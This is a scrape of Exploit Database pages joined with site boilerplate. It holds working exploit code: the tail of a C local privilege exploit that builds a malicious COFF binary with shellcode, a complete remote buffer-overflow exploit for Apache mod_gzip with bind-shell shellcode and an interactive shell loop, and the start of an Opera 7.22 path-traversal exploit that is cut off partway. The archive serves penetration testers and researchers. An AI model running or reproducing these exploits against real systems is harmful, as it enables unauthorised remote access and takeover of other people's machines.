0;ahdr.a_dstart = 0;ZERO(scn0);memcpy(&scn0.s_name, ".text", 5);scn0.s_paddr = 0x10000;scn0.s_vaddr = 0x10000;scn0.s_size = 4096;scn0.s_scnptr = sizeof(fhdr) + sizeof(ahdr) + (sizeof(scn0)*3);//file offset of .text segmentscn0.s_relptr = 0;scn0.s_lnnoptr = 0;scn0.s_nreloc = 0;scn0.s_nlnno = 0;scn0.s_flags = COFF_STYP_TEXT;ZERO(scn1);memcpy(&scn1.s_name, ".data", 5);scn1.s_paddr = 0x10000 - 4096;scn1.s_vaddr = 0x10000 - 4096;scn1.s_size = 4096;scn1.s_scnptr = sizeof(fhdr) + sizeof(ahdr) + (sizeof(scn0)*3) + 4096;//file offset of .data segmentscn1.s_relptr = 0;scn1.s_lnnoptr = 0;scn1.s_nreloc = 0;scn1.s_nlnno = 0;scn1.s_flags = COFF_STYP_DATA;ZERO(scn2);memcpy(&scn2.s_name, ".shlib", 6);scn2.s_paddr = 0;scn2.s_vaddr = 0;scn2.s_size = 0xb0; //HERE IS DA OVF!!! static_buffer = 128scn2.s_scnptr = sizeof(fhdr) + sizeof(ahdr) + (sizeof(scn0)*3) + 2*4096;//file offset of .data segmentscn2.s_relptr = 0;scn2.s_lnnoptr = 0;scn2.s_nreloc = 0;scn2.s_nlnno = 0;scn2.s_flags = COFF_STYP_SHLIB;offset = sizeof(fhdr) + sizeof(ahdr) + (sizeof(scn0)*3) + 3*4096;ptr = (char *) malloc(offset);if(!ptr) {perror("malloc");exit(-1);}memset(ptr, 0xcc, offset);  /* fill int3 *//* copy sections */offset = 0;memcpy(ptr, (char *) &fhdr, sizeof(fhdr));offset += sizeof(fhdr);memcpy(ptr+offset, (char *) &ahdr, sizeof(ahdr));offset += sizeof(ahdr);memcpy(ptr+offset, (char *) &scn0, sizeof(scn0));offset += sizeof(scn0);memcpy(ptr+offset, &scn1, sizeof(scn1));offset += sizeof(scn1);memcpy(ptr+offset, (char *) &scn2, sizeof(scn2));offset += sizeof(scn2);lptr = (u_long *) ((char *)ptr + sizeof(fhdr) + sizeof(ahdr) + \(sizeof(scn0) * 3) + 4096 + 4096 + 0xb0 - 8);shptr = (char *) malloc(4096);if(!shptr) {perror("malloc");exit(-1);}if(debug)printf("payload adr: 0x%.8x\t", shptr);memset(shptr, 0xcc, 4096);get_proc((pid_t) getppid(), &kp);pprocadr = (u_long) kp.kp_eproc.e_paddr;if(debug)printf("parent proc adr: 0x%.8x\n", pprocadr);*lptr++ = 0xdeadbeef;*lptr = (u_long) shptr;shellcode[5] = pprocadr & 0xff;shellcode[6] = (pprocadr >> 8) & 0xff;shellcode[7] = (pprocadr >> 16) & 0xff;shellcode[8] = (pprocadr >> 24) & 0xff;memcpy(shptr, shellcode, sizeof(shellcode)-1);unlink("./ibcs2own");if((fd = open("./ibcs2own", O_CREAT^O_RDWR, 0755)) < 0) {perror("open");exit(-1);}write(fd, ptr, sizeof(fhdr) + sizeof(ahdr) + (sizeof(scn0) * 3) + 4096 + 4096+ 4096);close(fd);free(ptr);signal(SIGSEGV, (void (*)())sig_handler);signal(SIGILL, (void (*)())sig_handler);signal(SIGSYS, (void (*)())sig_handler);signal(SIGBUS, (void (*)())sig_handler);signal(SIGABRT, (void (*)())sig_handler);signal(SIGTRAP, (void (*)())sig_handler);printf("\nDO NOT FORGET TO SHRED ./ibcs2own\n");execve(args[0], args, envs);perror("execve");}voidsig_handler(){_exit(0);}voidget_proc(pid_t pid, struct kinfo_proc *kp){u_int arr[4], len;arr[0] = CTL_KERN;arr[1] = KERN_PROC;arr[2] = KERN_PROC_PID;arr[3] = pid;len = sizeof(struct kinfo_proc);if(sysctl(arr, 4, kp, &len, NULL, 0) < 0) {perror("sysctl");fprintf(stderr, "this is an unexpected error, rerun!\n");exit(-1);}}// milw0rm.com [2003-11-19]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 126
Apache mod_gzip (with debug_mode) 1.2.26.1a - Remote Overflow - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDApache mod_gzip (with debug_mode) 1.2.26.1a - Remote OverflowEDB-ID:126CVE:2003-0842EDB Verified:Author:xCrZxType:remoteExploit:/Platform:LinuxDate:2003-11-20Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*\  	[exploit code] for mod_gzip (with debug_mode) <= 1.2.26.1a/\  	Created by xCrZx crazy_einstein yahoo com  /05.06.03//\  	Tested on RedHat 8.0 (Psyche) (here is target for it),/               also tested on FreeBSD 4.7 (1.3.19.2a) (here is no target for it :)/\*//*\/	Single mode:\/  	[crz@blacksand crz]$ ./85mod_gzip -t 0 -h localhost\/  	remote exploit for mod_gzip (debug_mode) [Linux/*BSD]\                   	by xCrZx [crazy_einstein@yahoo.com] /05.06.03//\  	Using: ret_err = 0x42127480, ret = 0xbfffd8f0/\    	[!] Connecting to localhost:80/      	[+] Connected!\      	[*] Trying to connect to localhost:2003 port!!! Pray for success!/      	[*] Sleeping at 2 seconds...\/      	[!] Shell is accessible!\/      	uid=99(nobody) gid=99(nobody) groups=99(nobody)\      	Linux blacksand 2.4.18-14 #1 Wed Sep 4 13:35:50 EDT 2002 i686 i686 i386 GNU/Linux/\	Brute mode:/\	[crz@blacksand crz]$ ./85mod_gzip -h localhost -b 0xbfffffff -s 1000/\	remote exploit for mod_gzip (debug_mode) [Linux/*BSD]/        	         by xCrZx [crazy_einstein@yahoo.com] /05.06.03/\/	Using: ret_err = 0x42127480, ret = 0xbfffffff ,step = 1000\/	[~] Brutemode activated!\	./	[!] Shell is accessible!\/	uid=99(nobody) gid=99(nobody) groups=99(nobody)\	Linux blacksand 2.4.18-14 #1 Wed Sep 4 13:35:50 EDT 2002 i686 i686 i386 GNU/Linux/\*/#include <stdio.h>#include <netinet/in.h>#include <netdb.h>#include <sys/types.h>#include <sys/socket.h>#include <sys/stat.h>#include <fcntl.h>#include <unistd.h>#include <errno.h>#define STEP 1000char fmt[] ="POST /?%s HTTP/1.1\r\n""Content-Type: text/html\r\n""Host: %s\r\n""Content-Length: %d\r\n""Accept-Encoding: gzip, deflate\r\n\r\n""%s\r\n\r\n";struct TARGETS {char *distr;long ret;long std_err;char *shellcode;char *jmp;} targets[] = {/* you can add targets here */{"RedHat 8.0 (Psyche)",  // disributive info0xbfffd8f0, // return address in stack0x42127480, // address of stderr//shellcode for Linux x86 -> bind shell on 2003 port//"\x31\xc0\x89\xc3\xb0\x02\xcd\x80\x38\xc3\x74\x05\x8d\x43\x01\xcd\x80""\x31\xc0\x89\x45\x10\x40\x89\xc3\x89\x45\x0c\x40\x89\x45\x08\x8d\x4d""\x08\xb0\x66\xcd\x80\x89\x45\x08\x43\x66\x89\x5d\x14\x66\xc7\x45\x16""\x07\xd3\x31\xd2\x89\x55\x18\x8d\x55\x14\x89\x55\x0c\xc6\x45\x10\x10""\xb0\x66\xcd\x80\x40\x89\x45\x0c\x43\x43\xb0\x66\xcd\x80\x43\x89\x45""\x0c\x89\x45\x10\xb0\x66\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41""\x80\xf9\x03\x75\xf6\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62""\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80",/*special jump instruction (to avoid bad characters in url):(jump on our shellcode into heap)movl $0xa1a51baa,%ebxaddl $0x66666666,%ebxjmp *%ebx*/"\xbb\xaa\x1b\xa5\xa1\x81\xc3\x66\x66\x66\x66\xff\xe3"} };long getip(char *hostname) {struct hostent *he;long ipaddr;if ((ipaddr = inet_addr(hostname)) < 0) {if ((he = gethostbyname(hostname)) == NULL) {perror("gethostbyname()");exit(-1);}memcpy(&ipaddr, he->h_addr, he->h_length);}return ipaddr;}void usage(char *prog) {int i=0;printf("\nUsage: %s <-h www.victim.com> [-p port] [-t target] [-r manual_retaddr][-b addr] [-s step_num]\n\nTargets:\n",prog);while(targets[i++].distr) printf("\t[%d] -> %s\n",i-1,targets[i-1].distr);printf("\n");exit(0);}int main(int argc, char **argv) {int i=0;struct sockaddr_in sockstruct;struct hostent *HOST;char tmp[20000];char buf1[5000],buf2[10000];int sock;fd_set  rset;int port=80,shellport=2003;int step=STEP;char *victim=NULL;long ret=0xbfffffff,ret_err;int brutemode=0;char *shellcode,*jmp;int trg=0;printf("\nremote exploit for mod_gzip (debug_mode) [Linux/*BSD]\n\t\t by xCrZx [crazy_einstein] /05.06.03/\n");for(i=0;i<argc;i++) {if(argv[i][1]=='h') victim=argv[i+1];if(argv[i][1]=='p') port=atoi(argv[i+1]);if(argv[i][1]=='t') {ret=targets[atoi(argv[i+1])].ret;trg=atoi(argv[i+1]);}if(argv[i][1]=='r') sscanf(argv[i+1],"0x%x",&ret);if(argv[i][1]=='b') { brutemode=1; ret=strtoul(argv[i+1],0,16);}if(argv[i][1]=='s') { step=atoi(argv[i+1]);}}if(!victim || ret==0) usage(argv[0]);ret_err=targets[trg].std_err;shellcode=targets[trg].shellcode;jmp=targets[trg].jmp;printf("\nUsing: ret_err = 0x%x, ret = 0x%x",ret_err,ret);if(brutemode) printf(" ,step = %d\n",step);printf("\n");if(brutemode)printf("[~] Brutemode activated!\n");do {sock=socket(PF_INET,SOCK_STREAM,0);sockstruct.sin_family=PF_INET;sockstruct.sin_addr.s_addr=getip(victim);sockstruct.sin_port=htons(port);if(!brutemode)printf("\n[!] Connecting to %s:%d\n",victim,port);if(connect(sock,(struct sockaddr*)&sockstruct,sizeof(sockstruct))>-1) {if(!brutemode)printf("[+] Connected!\n",i);memset(tmp ,0x00,sizeof tmp );memset(buf1,0x00,sizeof buf1);memset(buf2,0x00,sizeof buf2);memset(buf1,0x90,2016);memcpy(buf1+strlen(buf1),jmp,strlen(jmp));memset(buf1+strlen(buf1),0x90,2280);*(long *)&buf1[strlen(buf1)]=ret_err;for(i=0;i<100;i++) *(long *)&buf1[strlen(buf1)]=ret;memset(buf2,0x90,1000);memcpy(buf2+strlen(buf2),shellcode,strlen(shellcode));sprintf(tmp,fmt,buf1,victim,strlen(buf2),buf2);write(sock,tmp,strlen(tmp));}else { printf("[x] Error: Could not connect to %s:%d!\n",victim,port);exit(0);}close(sock);ret-= step;if(brutemode) {printf(".");fflush(stdout);}if(!brutemode) {printf("[*] Trying to connect to %s:%d port!!! Pray for success!\n",victim,shellport);printf("[*] Sleeping at 2 seconds...\n");}sleep(2);sock=socket(PF_INET,SOCK_STREAM,0);bzero(sockstruct.sin_zero,sizeof(sockstruct.sin_zero));sockstruct.sin_family=PF_INET;sockstruct.sin_addr.s_addr=getip(victim);sockstruct.sin_port=htons(shellport);if(connect(sock,(struct sockaddr*)&sockstruct,sizeof(sockstruct))>-1) {printf("\n[!] Shell is accessible!\n\n");write(sock, "id;uname -a\n", 12);while (1) {FD_ZERO(&rset);FD_SET(sock,&rset);FD_SET(STDIN_FILENO,&rset);select(sock + 1, &rset, NULL, NULL, NULL);if (FD_ISSET(sock, &rset)) {i = read(sock, tmp, sizeof(tmp) - 1);if (i <= 0) {printf("[!] Connection closed.\n");close(sock);exit(0);}tmp[i] = 0;printf("%s", tmp);}if (FD_ISSET(STDIN_FILENO, &rset)) {i = read(STDIN_FILENO, tmp, sizeof(tmp) - 1);if (i > 0) {tmp[i]=0;write(sock, tmp, i);}}}} else if(!brutemode)printf("[x] Shell is inaccessible..\n\n");close(sock);} while ( brutemode );return 0;}// milw0rm.com [2003-11-20]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 127
Opera 7.22 - File Creation and Execution (WebServer) - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDOpera 7.22 - File Creation and Execution (WebServer)EDB-ID:127CVE:EDB Verified:Author:nesuminType:remoteExploit:/Platform:WindowsDate:2003-11-22Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/usr/bin/perl#################################################### Sample code of#   "[Opera 7] Arbitrary File Auto-Saved Vulnerability."##   This Exploit will run a webserver that will create and execute a batch#   file on the victim's computer when visiting this malicious server##   This perl script is a small HTTP server for a check ofthe vulnerability.#   BTW, you can exploit this vulnerability without a server like this#   if your apache or etc., allow a request URL that contains '..'.## Tested on :#   Opera 7.22#   Opera 7.21#   Opera 7.20#   Opera 7.1X#   Opera 7.0X##   with Active Perl 5.8.0 on Windows 2000 Pro SP4 JP.#   (maybe need Perl 5.6 or later)## Usage :#  [0] Execute "perl this_script 10080" on a console,#      this server starts to listen in port 10080.#  [1] Opera opens "http://127.0.0.1:10080/".#  [2] Click link.#  [3] Auto-saved an arbitrary file on a root directory#      of Local Disk ...## 2003/11/15# written by nesumin <nesumin softhome net># public on www.k-otik.com####################################################use HTTP::Daemon;use HTTP::Status;use constant URL => '..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C_opera_.bat';use constant FILE_CONTENT => qq~\@echo off\x0D\x0Aecho "Love & Peace :-)"\x0D\x0A\@pause~;use constant RES_HEADERS => qw(Pragma no-cache Connection close);use constant REUSE => 1;use constant VIEW_DATA => 0;my @MIMETYPES = qw(application/x-opera-configuration-keyboardapplication/x-opera-configuration-menuapplication/x-opera-configuration-mouseapplication/x-opera-configuration-toolbarapplication/x-opera-configuration-skinapplication/x-opera-skin);my $port = ($ARGV[0] || 10080) + 0;die("port is not correct") unless (0 < $port && $port < 65536);my $daemon = new HTTP::Daemon(LocalPort=>$port, Reuse=>REUSE)or die("HTTP::Daemon->new() error : $!.\n");select(STDERR);printf("[*] server started on %d.\n", $daemon->sockport());while (my $ccon = 